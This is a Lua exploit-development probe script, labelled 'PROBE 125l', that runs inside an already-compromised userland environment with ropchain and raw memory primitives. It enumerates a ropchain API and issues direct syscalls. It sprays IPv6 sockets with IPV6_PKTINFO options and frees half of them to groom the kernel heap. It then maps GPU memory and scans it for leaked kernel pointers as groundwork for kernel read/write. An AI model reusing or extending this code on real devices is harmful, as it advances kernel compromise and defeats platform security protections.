-- CRASH_CLASS: LOW
-- PROBE 125l: Use ropchain to make direct syscalls and explore kernel
-- The ropchain class has push_syscall - use it to call arbitrary syscalls
-- with full argument control. Also explore the ropchain API.

print("=== PROBE 125l: ROPCHAIN DIRECT SYSCALL ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Section A: Explore ropchain API
print("--- SECTION A: ROPCHAIN API ---")
print("ropchain type=" .. type(ropchain))
if type(ropchain) == "function" then
    -- ropchain() creates a new chain
    local chain = ropchain()
    print("chain type=" .. type(chain))
    if type(chain) == "table" then
        local mt = getmetatable(chain)
        if mt then
            print("chain metatable:")
            for k, v in pairs(mt) do print("  mt." .. tostring(k) .. "=" .. type(v)) end
            if mt.__index and type(mt.__index) == "table" then
                print("chain methods:")
                for k, v in pairs(mt.__index) do print("  " .. tostring(k) .. "=" .. type(v)) end
            end
        end
        for k, v in pairs(chain) do print("  " .. tostring(k) .. "=" .. tostring(v)) end
    end
elseif type(ropchain) == "table" then
    for k, v in pairs(ropchain) do print("  " .. tostring(k) .. "=" .. type(v)) end
end

-- Section B: Use ropchain to call getuid (syscall 24)
print("")
print("--- SECTION B: GETUID VIA ROPCHAIN ---")
local ok_b, err_b = pcall(function()
    local chain = ropchain()
    -- Try calling getuid: rax=24, no args needed
    -- Need to understand the push_syscall API first
    -- push_syscall takes a syscall object (like syscall.pipe)
    -- Let's see what methods chain has

    -- Instead of push_syscall, try using fcall with the syscall stub
    -- syscall.getuid should exist
    local uid = syscall.getuid()
    print("getuid via syscall.getuid()=" .. tostring(uid))
    print("  numeric=" .. to_num(uid))
end)
print("section B: ok=" .. tostring(ok_b) .. " err=" .. tostring(err_b))

-- Section C: Create IPv6 sockets for kernel R/W setup
print("")
print("--- SECTION C: IPV6 SOCKET CREATION ---")
local ok_c, err_c = pcall(function()
    -- AF_INET6=28, SOCK_DGRAM=2, IPPROTO_UDP=17
    local socket_fn = fcall(libc_addrofs.calloc) -- just to test

    -- Use syscall to create IPv6 UDP socket
    local fd = syscall.socket(28, 2, 17)
    print("IPv6 UDP socket fd=" .. tostring(fd) .. " numeric=" .. to_num(fd))

    if to_num(fd) >= 0 then
        -- Try setsockopt IPV6_PKTINFO (46) to set up pktopts
        local pktinfo = memory.alloc(32)
        -- struct in6_pktinfo: in6_addr (16 bytes) + ifindex (4 bytes)
        memory.write_dword(pktinfo + 16, 0) -- ifindex=0

        local ret = syscall.setsockopt(fd, 41, 46, pktinfo, 20) -- IPPROTO_IPV6=41, IPV6_PKTINFO=46
        print("setsockopt IPV6_PKTINFO ret=" .. tostring(ret) .. " numeric=" .. to_num(ret))

        -- Try IPV6_TCLASS (61)
        local tclass = memory.alloc(4)
        memory.write_dword(tclass, 0)
        ret = syscall.setsockopt(fd, 41, 61, tclass, 4)
        print("setsockopt IPV6_TCLASS ret=" .. tostring(ret) .. " numeric=" .. to_num(ret))

        -- Create a second IPv6 socket
        local fd2 = syscall.socket(28, 2, 17)
        print("IPv6 UDP socket2 fd=" .. tostring(fd2) .. " numeric=" .. to_num(fd2))

        if to_num(fd2) >= 0 then
            ret = syscall.setsockopt(fd2, 41, 46, pktinfo, 20)
            print("socket2 setsockopt IPV6_PKTINFO ret=" .. tostring(ret) .. " numeric=" .. to_num(ret))
        end

        -- Close sockets
        syscall.close(fd)
        syscall.close(fd2)
        print("sockets closed")
    end
end)
print("section C: ok=" .. tostring(ok_c) .. " err=" .. tostring(err_c))

-- Section D: Explore ipv6_kernel_rw module
print("")
print("--- SECTION D: IPV6_KERNEL_RW MODULE ---")
if ipv6_kernel_rw then
    print("ipv6_kernel_rw exists")
    for k, v in pairs(ipv6_kernel_rw) do
        print("  " .. tostring(k) .. "=" .. type(v))
    end
else
    print("ipv6_kernel_rw NOT FOUND (checking _G)")
    for k, v in pairs(_G) do
        if type(k) == "string" and k:find("ipv6") then
            print("  _G." .. k .. "=" .. type(v))
        end
        if type(k) == "string" and k:find("kernel") then
            print("  _G." .. k .. "=" .. type(v))
        end
    end
end

-- Section E: What's in the kernel table?
print("")
print("--- SECTION E: KERNEL TABLE ---")
if kernel then
    for k, v in pairs(kernel) do
        if type(v) == "table" then
            print("  kernel." .. tostring(k) .. " = {")
            for k2, v2 in pairs(v) do
                print("    " .. tostring(k2) .. "=" .. tostring(v2))
            end
            print("  }")
        else
            print("  kernel." .. tostring(k) .. " = " .. tostring(v))
        end
    end
else
    print("kernel table NOT FOUND")
end

-- Section F: Scan heap for kernel pointers after creating many kernel objects
print("")
print("--- SECTION F: KERNEL OBJECT SPRAY + HEAP SCAN ---")
local ok_f, err_f = pcall(function()
    -- Create many sockets and pipes to spray kernel objects
    local fds = {}
    for i = 1, 50 do
        local fd = syscall.socket(28, 2, 17)
        if to_num(fd) >= 0 then
            -- Set IPV6_PKTINFO to allocate pktopts
            local pktinfo = memory.alloc(32)
            memory.write_dword(pktinfo + 16, 0)
            syscall.setsockopt(fd, 41, 46, pktinfo, 20)
            fds[#fds + 1] = fd
        end
    end
    print("created " .. #fds .. " IPv6 sockets with pktopts")

    -- Close half to create freed objects in heap
    for i = 1, math.floor(#fds / 2) do
        syscall.close(fds[i])
    end
    print("closed " .. math.floor(#fds / 2) .. " sockets")

    -- GPU mmap to get heap access
    local sc_mmap = make_syscall(477)
    local gpu = sc_mmap(uint64(0), uint64(64 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local gpu_num = to_num(gpu)
    print(string.format("GPU mmap at 0x%X", gpu_num))

    if gpu_num > 0 and gpu_num < 0xFFFFFFFF then
        -- Scan for kernel pointers
        local kptrs_found = 0
        local scan_pages = 32
        for page = 0, scan_pages - 1 do
            for off = 0, 0x3FF8, 8 do
                local addr = gpu + page * 0x4000 + off
                local ok_r, q = pcall(memory.read_qword, addr)
                if ok_r then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        kptrs_found = kptrs_found + 1
                        if kptrs_found <= 30 then
                            print(string.format("  KPTR page=%d +0x%04X: 0x%08X%08X", page, off, h, l))
                        end
                    end
                end
            end
        end
        print("total kernel pointers found: " .. kptrs_found)
    end

    -- Cleanup remaining sockets
    for i = math.floor(#fds / 2) + 1, #fds do
        syscall.close(fds[i])
    end
end)
print("section F: ok=" .. tostring(ok_f) .. " err=" .. tostring(err_f))

print("=== PROBE 125l COMPLETE ===")
